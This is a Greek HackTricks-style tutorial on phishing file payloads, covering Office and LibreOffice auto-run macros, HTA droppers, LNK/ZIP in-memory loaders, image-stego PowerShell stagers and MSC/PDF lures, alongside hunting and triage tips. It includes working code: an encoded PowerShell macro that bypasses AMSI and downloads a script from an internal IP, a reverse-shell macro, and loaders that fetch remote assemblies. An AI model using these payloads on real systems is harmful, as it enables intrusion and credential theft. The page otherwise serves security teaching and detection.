# Αρχεία και έγγραφα phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης δομών δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση των δομών δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκτασή του, διατηρώντας παράλληλα τη δυνατότητα εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros εκ σχεδιασμού, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα υποβληθεί σε επεξεργασία από το Microsoft Word και θα μπορεί να εκτελέσει macros.\
Τα ίδια εσωτερικά στοιχεία και οι ίδιοι μηχανισμοί ισχύουν για όλα τα προγράμματα της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελεστούν από ορισμένα προγράμματα Office:

```bash
assoc | findstr /i "word excel powerp"
```

Αρχεία DOCX που αναφέρονται σε ένα απομακρυσμένο πρότυπο (File –Options –Add-ins –Manage: Templates –Go) το οποίο περιλαμβάνει macros μπορούν επίσης να «εκτελέσουν» macros.

### Φόρτωση εξωτερικής εικόνας

Μεταβείτε στο: _Εισαγωγή --> Γρήγορα Τμήματα --> Πεδίο_\
_**Κατηγορίες**: Σύνδεσμοι και αναφορές, **Ονόματα πεδίων**: includePicture και **Όνομα αρχείου ή URL**:_ http://<ip>/whatever

![Έγγραφα Office - Φόρτωση εξωτερικής εικόνας: Μεταβείτε στο: Εισαγωγή -- Γρήγορα Τμήματα -- Πεδίο](<../../images/image (155).png>)

Για την ανάλυση ενός εγγράφου που λάβατε αντί για τη δημιουργία ενός, δείτε [Ανάλυση VBA macro: άχρηστος κώδικας και UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor μέσω Macros

Μπορείτε να χρησιμοποιήσετε macros για να εκτελέσετε αυθαίρετο κώδικα από το έγγραφο.

#### Συναρτήσεις αυτόματης φόρτωσης

Όσο πιο συνηθισμένες είναι, τόσο πιθανότερο είναι να τις εντοπίσει το AV.

- AutoOpen()
- Document_Open()

#### Παραδείγματα κώδικα Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Μη αυτόματη αφαίρεση μεταδεδομένων

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, για να ανοίξετε το Document Inspector. Κάντε κλικ στο **Inspect** και έπειτα στο **Remove All**, δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση Doc

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type** και αλλάξτε τη μορφή από **`.docx`** σε Word 97-2003 **`.doc`**.\
Κάντε το επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε αρχείο `.docx`** και υπάρχει **στίγμα** γύρω από την επέκταση **`.docm`**, που υποστηρίζει macro (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες web/email τα αποκλείουν εντελώς). Επομένως, η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Generators κακόβουλων Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αυτόματη εκτέλεση macros στο LibreOffice ODT (Basic)

Τα έγγραφα του LibreOffice Writer μπορούν να ενσωματώνουν Basic macros και να τα εκτελούν αυτόματα κατά το άνοιγμα του αρχείου, συνδέοντας το macro με το συμβάν **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ένα απλό macro reverse shell μοιάζει ως εξής:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στη συμβολοσειρά – το LibreOffice Basic χρησιμοποιεί διπλά εισαγωγικά για να διαφύγει τα κυριολεκτικά εισαγωγικά, επομένως τα payloads που τελειώνουν σε `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το αρχείο ως `.odt` και συνδέστε τη macro με το συμβάν του εγγράφου, ώστε να εκτελείται αμέσως κατά το άνοιγμα.
- Όταν στέλνετε email με το `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` είναι απαραίτητο, ώστε να σταλούν τα bytes του αρχείου και όχι το όνομα του αρχείου ως συμβολοσειρά συνημμένου). Αυτό είναι κρίσιμο όταν γίνεται κατάχρηση SMTP servers που δέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς επικύρωση.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί το περιβάλλον εργασίας χρήστη και εκτελείται ως εφαρμογή με «πλήρη εμπιστοσύνη», χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός browser.

Ένα HTA εκτελείται με το **`mshta.exe`**, το οποίο είναι συνήθως **εγκατεστημένο** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Επομένως, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Κάρτες ψεύτικων συνημμένων σε HTML email

Ένα HTML email μπορεί να μιμηθεί την κάρτα προεπισκόπησης συνημμένου ενός παρόχου, αντί να περιέχει πραγματικό συνημμένο. Η Talos παρατήρησε μια κάρτα Gmail αναδημιουργημένη από τέσσερα inline PNG MIME parts κωδικοποιημένα σε Base64. Όλο το οπτικό στοιχείο ήταν τυλιγμένο σε ένα anchor και μια τιμή παραλήπτη στο `?m=<target-id>` επέτρεπε την παρακολούθηση ανά παραλήπτη. Ο σύνδεσμος άρχιζε με `//` αντί για `http://` ή `https://`· οι browsers επιλύουν αυτήν τη σχετική ως προς το πρωτόκολλο μορφή, αλλά μπορεί να διαφύγει από URL extractors που εντοπίζουν μόνο πλήρως προσδιορισμένα URLs.<sup>[[11]](#references)</sup>

Κατά την ανάλυση, εξετάστε το ακατέργαστο MIME αντί να εμπιστεύεστε τη λίστα συνημμένων που εμφανίζεται. Ανασυνθέστε τον τρόπο με τον οποίο τα inline image parts σχηματίζουν την οπτική κάρτα, εντοπίστε το anchor που την περιβάλλει και κανονικοποιήστε τις τιμές `href` που είναι σχετικές ως προς το πρωτόκολλο πριν εξαγάγετε URLs.<sup>[[11]](#references)</sup>

Για δοκιμές spoofing αποστολέα envelope/header και ευθυγράμμισης DMARC, δείτε το [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Εξαναγκασμός NTLM Authentication

Υπάρχουν διάφοροι τρόποι να **εξαναγκάσετε NTLM authentication «απομακρυσμένα»**· για παράδειγμα, θα μπορούσατε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML στα οποία θα έχει πρόσβαση ο χρήστης (ακόμη και μέσω HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσουν** **authentication** απλώς και μόνο με το **άνοιγμα του φακέλου**.

**Δείτε αυτές τις ιδέες και άλλες στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι μπορείτε όχι μόνο να κλέψετε το hash ή τα στοιχεία authentication, αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads ενσωματωμένα σε ZIP (fileless chain)

Ιδιαίτερα αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα παραπλανητικά έγγραφα (PDF/DOCX) και ένα κακόβουλο .lnk. Το τέχνασμα είναι ότι ο πραγματικός PowerShell loader είναι αποθηκευμένος μέσα στα ακατέργαστα bytes του ZIP, μετά από ένα μοναδικό marker, και το .lnk τον carve-άρει και τον εκτελεί εξ ολοκλήρου στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιείται από το PowerShell one-liner του .lnk:

1) Εντοπίζει το αρχικό ZIP σε συνηθισμένες διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και τον γονικό φάκελο του τρέχοντος working directory.
2) Διαβάζει τα bytes του ZIP και εντοπίζει ένα hardcoded marker (π.χ., xFIQCV). Ό,τι ακολουθεί μετά το marker είναι το ενσωματωμένο PowerShell payload.
3) Αντιγράφει το ZIP στο %ProgramData%, το αποσυμπιέζει εκεί και ανοίγει το παραπλανητικό .docx για να φαίνεται νόμιμο.
4) Παρακάμπτει το AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Κάνει deobfuscate το επόμενο stage (π.χ., αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.

Παράδειγμα σκελετού PowerShell για εξαγωγή και εκτέλεση του ενσωματωμένου stage:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Σημειώσεις
- Η παράδοση συχνά κάνει κατάχρηση αξιόπιστων subdomains PaaS (π.χ., *.herokuapp.com) και μπορεί να φιλτράρει τα payloads (να σερβίρει αβλαβή ZIP ανάλογα με την IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί shellcode σε base64/XOR και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιήσει τα ίχνη στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του στοιχείου ελέγχου Microsoft Web Browser, ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή το ενσωματώνει να επανεκκινεί αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε λεπτομέρειες και έτοιμες προς χρήση εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Αναζήτηση/IOCs
- Αρχεία ZIP που περιέχουν τη συμβολοσειρά δείκτη ASCII (π.χ., xFIQCV) προσαρτημένη στα δεδομένα του αρχείου.
- Αρχείο .lnk που απαριθμεί τους γονικούς φακέλους/φακέλους χρήστη για να εντοπίσει το ZIP και ανοίγει ένα παραπλανητικό έγγραφο.
- Παραποίηση του AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροσκελή επαγγελματικά νήματα συνομιλιών που καταλήγουν σε συνδέσμους φιλοξενούμενους σε αξιόπιστα domains PaaS.

## LNK με πρώτα το παραπλανητικό έγγραφο → persistence μέσω scheduled task → side-loading από έμπιστο CPL

Ένα ακόμη επαναλαμβανόμενο μοτίβο είναι ένα **`.lnk` που παριστάνει έγγραφο** και ανοίγει αμέσως ένα αβλαβές παραπλανητικό έγγραφο, ενώ στο παρασκήνιο προετοιμάζει την πραγματική αλυσίδα.<sup>[[3]](#references)</sup>

Παρατηρημένη ροή εργασίας:
1. Η συντόμευση **μεταμφιέζεται σε PDF** και χρησιμοποιεί το `conhost.exe` ή κάποιο παρόμοιο proxy για να εκκινήσει ένα obfuscated PowerShell downloader.
2. Το PowerShell κατακερματίζει προφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε οι απλοϊκοί μηχανισμοί ανίχνευσης που αναζητούν `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να μην εντοπίζουν την εντολή.
3. Το stager κατεβάζει **πρώτα το παραπλανητικό έγγραφο**, το ανοίγει για το θύμα και στη συνέχεια ανασυνθέτει τα κακόβουλα αρχεία στο παρασκήνιο.
4. Τα payloads μπορεί να εγγραφούν με **άχρηστες επεκτάσεις** και στη συνέχεια να μετονομαστούν με αφαίρεση χαρακτήρων-πλήρωσης, καθυστερώντας την εμφάνιση προφανών artifacts `.exe` / `.cpl`.
5. Το Persistence εγκαθίσταται με ένα **scheduled task που εκτελείται ανά λεπτό** και εκκινεί ένα έμπιστο host binary από μια διαδρομή εγγράψιμη από τον χρήστη.

Ελάχιστα στοιχεία αναζήτησης για αυτό το μοτίβο:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Μια χρήσιμη διάταξη staging που αξίζει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο στάδιο είναι stealthy

Στη μελέτη περίπτωσης της Rapid7, η scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί δίπλα του και εξήγαγε το **`RunFODW`**, το έμπιστο δυαδικό αρχείο της Microsoft έκανε side-load το CPL του εισβολέα αντί για το νόμιμο αντίγραφο του συστήματος.

Στη συνέχεια, το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω του **Windows CNG / `bcrypt.dll`**
- Δεσμεύει εκτελέσιμη μνήμη και αντιγράφει εκεί το αποκρυπτογραφημένο shellcode
- Το εκτελεί έμμεσα περνώντας τον δείκτη του shellcode ως callback για το **`EnumUILanguagesW`**

Αξίζει να αναζητήσετε ξεχωριστά αυτό το τελευταίο βήμα: το malware συχνά αποφεύγει ένα άμεσο άλμα `((void(*)())buf)()` και αντ' αυτού καταχράται ένα **νόμιμο WinAPI που δέχεται callback** για να μεταφέρει την εκτέλεση.

Το αποκρυπτογραφημένο payload σε αυτήν την καμπάνια ήταν shellcode **Donut**, το οποίο στη συνέχεια χαρτογράφησε το τελικό PE εξ ολοκλήρου στη μνήμη και έκανε patch τα **AMSI/WLDP/ETW** στην τρέχουσα διεργασία πριν παραδώσει την εκτέλεση. Για περισσότερες λεπτομέρειες σχετικά με το side-loading και τη μεταγενέστερη επεξεργασία στη μνήμη, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά σημεία για αναζήτηση:
- `.lnk` που εκκινεί `powershell.exe` ή `conhost.exe` και ακολουθείται από ένα ορατό έγγραφο-δόλωμα.
- Λήψεις μικρής διάρκειας στο **`C:\Users\Public\`** και άμεση μετονομασία από επεκτάσεις χωρίς νόημα.
- Scheduled tasks με αδιάφορα ονόματα, όπως `GoogleErrorReport`, που εκτελούνται από **εγγράψιμους από τον χρήστη καταλόγους**.
- Έμπιστα δυαδικά αρχεία που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο κατάλογο εκτός συστήματος.
- Blobs κειμένου Base64 που γράφονται στο **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το module που έχει γίνει side-load.

## Payloads οριοθετημένα με steganography σε εικόνες (PowerShell stager)

Πρόσφατες αλυσίδες loader παραδίδουν ένα obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Το stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως απλό κείμενο ανάμεσα σε μοναδικούς δείκτες αρχής/τέλους. Το script αναζητά αυτούς τους οριοθέτες (παραδείγματα που έχουν εντοπιστεί στην πράξη: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο ανάμεσά τους, το αποκωδικοποιεί από Base64 σε bytes, φορτώνει το assembly στη μνήμη και καλεί μια γνωστή μέθοδο εισόδου με το URL του C2.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Στάδιο 1: Dropper JS/VBS μέσα σε αρχείο αρχειοθέτησης → αποκωδικοποιεί ενσωματωμένο Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Στάδιο 2: PowerShell stager → κατεβάζει εικόνα, εξάγει Base64 που οριοθετείται από δείκτες, φορτώνει το .NET DLL στη μνήμη και καλεί τη μέθοδό του (π.χ. VAI), περνώντας το URL και τις επιλογές του C2.
- Στάδιο 3: Ο loader ανακτά το τελικό payload και συνήθως το κάνει inject μέσω process hollowing σε ένα έμπιστο δυαδικό αρχείο (συχνά το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα για το process hollowing και την εκτέλεση μέσω έμπιστων βοηθητικών προγραμμάτων εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Παράδειγμα PowerShell για εξαγωγή ενός DLL από εικόνα και κλήση μιας μεθόδου .NET στη μνήμη:

<details>
<summary>Εξαγωγέας και loader payload stego σε PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Σημειώσεις
- Πρόκειται για το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι markers διαφέρουν ανά campaign.
- Τα AMSI/ETW bypass και η απο-συσκότιση συμβολοσειρών εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Hunting: σαρώστε εικόνες που έχουν ληφθεί για γνωστά delimiters· εντοπίστε περιπτώσεις όπου το PowerShell αποκτά πρόσβαση σε εικόνες και αποκωδικοποιεί αμέσως blobs Base64.

Δείτε επίσης εργαλεία stego και τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα επαναλαμβανόμενο αρχικό στάδιο είναι ένα μικρό, έντονα obfuscated αρχείο `.js` ή `.vbs` που παραδίδεται μέσα σε archive. Μοναδικός σκοπός του είναι να αποκωδικοποιήσει μια ενσωματωμένη συμβολοσειρά Base64 και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να εκκινήσει το επόμενο στάδιο μέσω HTTPS.<sup>[[5]](#references)</sup>

Σκελετός λογικής (αφηρημένος):
- Ανάγνωση των περιεχομένων του ίδιου του αρχείου
- Εντοπισμός ενός blob Base64 ανάμεσα σε συμβολοσειρές junk
- Αποκωδικοποίηση σε ASCII PowerShell
- Εκτέλεση με `wscript.exe`/`cscript.exe` που καλεί το `powershell.exe`

Ενδείξεις για hunting
- Συνημμένα JS/VBS μέσα σε archive που εκκινούν το `powershell.exe` με `-enc`/`FromBase64String` στη γραμμή εντολών.
- Το `wscript.exe` εκκινεί το `powershell.exe -nop -w hidden` από προσωρινές διαδρομές χρήστη.

## Έγγραφα MSC ως containers εκτέλεσης (GrimResource)

Τα αρχεία Microsoft Management Console (`.msc`) είναι ορισμοί κονσόλας XML που ανοίγονται συνήθως από το `mmc.exe`. Το **GrimResource** οπλοποιεί μια αναφορά `StringTable` σε έναν πόρο `apds.dll` που περιέχει ένα παλιό XSS primitive, έτσι ώστε όταν ένας χρήστης ανοίξει την ειδικά διαμορφωμένη κονσόλα, να εκτελείται JavaScript μέσα στο `mmc.exe`. Τα δείγματα που παρατηρήθηκαν συνδύαζαν obfuscation βασισμένο στο `transformNode` με το **DotNetToJScript**, για να δημιουργήσουν ένα .NET payload χωρίς τη συνήθη διαδρομή των Office macro.<sup>[[9]](#references)</sup>

Για static triage, αντιμετωπίστε ένα μη έμπιστο MSC ως κείμενο και **μην το ανοίξετε με διπλό κλικ**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Τα runtime pivots με υψηλή αξία είναι όταν το `mmc.exe` φορτώνει το CLR ή στοιχεία script, δημιουργεί συνδέσεις δικτύου ή εκκινεί τα `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ή κάποιο μη αναμενόμενο εκτελέσιμο. Η μορφή είναι νόμιμη, επομένως οι ανιχνεύσεις θα πρέπει να συσχετίζουν **προέλευση + ύποπτο περιεχόμενο XML/script + συμπεριφορά του `mmc.exe`**, αντί να αποκλείουν κάθε MSC.<sup>[[9]](#references)</sup>

## Μηχανισμοί ανακατεύθυνσης PDF/QR και payload gating

Ένα PDF δεν χρειάζεται exploit για να είναι χρήσιμο. Πρόσφατες καμπάνιες τοποθετούν έναν **κωδικό QR ή έναν συνηθισμένο σύνδεσμο** σε ένα έγγραφο που φαίνεται ακίνδυνο, μεταφέρουν την περίοδο λειτουργίας του browser εκτός των ελέγχων αλληλογραφίας και εξατομικεύουν τον προορισμό με τη διεύθυνση του παραλήπτη. Η Microsoft τεκμηρίωσε PDF του 2025 με URL κωδικών QR μοναδικά για κάθε παραλήπτη, τα οποία οδηγούσαν σε υποδομή υποκλοπής διαπιστευτηρίων RaccoonO365· μια παράλληλη αλυσίδα χρησιμοποιούσε gating βάσει IP/περιβάλλοντος, ώστε να επιστρέφει διαδρομή JavaScript/MSI σε επιλεγμένους επισκέπτες, αλλά ένα ακίνδυνο PDF σε scanners ή μη επιτρεπόμενα clients.<sup>[[10]](#references)</sup>

Εξετάστε τόσο τις ενέργειες PDF όσο και τους αποδοσμένους κωδικούς QR. Ένας κωδικός QR μπορεί να έχει σχεδιαστεί ως vector αντί να είναι αποθηκευμένος ως εξαγώγιμη εικόνα, επομένως μετατρέψτε κάθε σελίδα σε raster, εκτός από την εξαγωγή των ενσωματωμένων εικόνων:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Επιθεωρήστε τους αποκωδικοποιημένους προορισμούς και τις ανακατευθύνσεις από ένα απομονωμένο σύστημα ανάλυσης, χωρίς να πραγματοποιήσετε έλεγχο ταυτότητας. Χρήσιμες ενδείξεις για τον εντοπισμό περιλαμβάνουν PDF που περιέχουν μόνο QR code και σχεδόν κενά σώματα email, τη διεύθυνση email του παραλήπτη ενσωματωμένη σε παράμετρο query, πολλαπλές ανακατευθύνσεις μέσω αξιόπιστων υπηρεσιών φιλοξενίας και διαφορετικό περιεχόμενο ανάλογα με τη διεύθυνση IP, τη γεωγραφική τοποθεσία, τα cookies, τον referrer ή τον user agent. Συγκρίνετε αιτήματα με ελεγχόμενα προφίλ, καθώς μία μόνο ανάκτηση από sandbox μπορεί να λάβει μόνο το δόλωμα.<sup>[[10]](#references)</sup>

## Αρχεία Windows για υποκλοπή NTLM hashes

Δείτε τη σελίδα σχετικά με τα σημεία από όπου μπορείτε να υποκλέψετε διαπιστευτήρια NTLM:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Μακροεντολή LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Εκστρατεία ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση των τακτικών του Dropping Elephant μέσω αλυσίδας loader με θέμα την Κίνα](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Παραβίαση του TypeLib – Νέα τεχνική persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο loader PhantomVAI διανέμει διάφορα infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
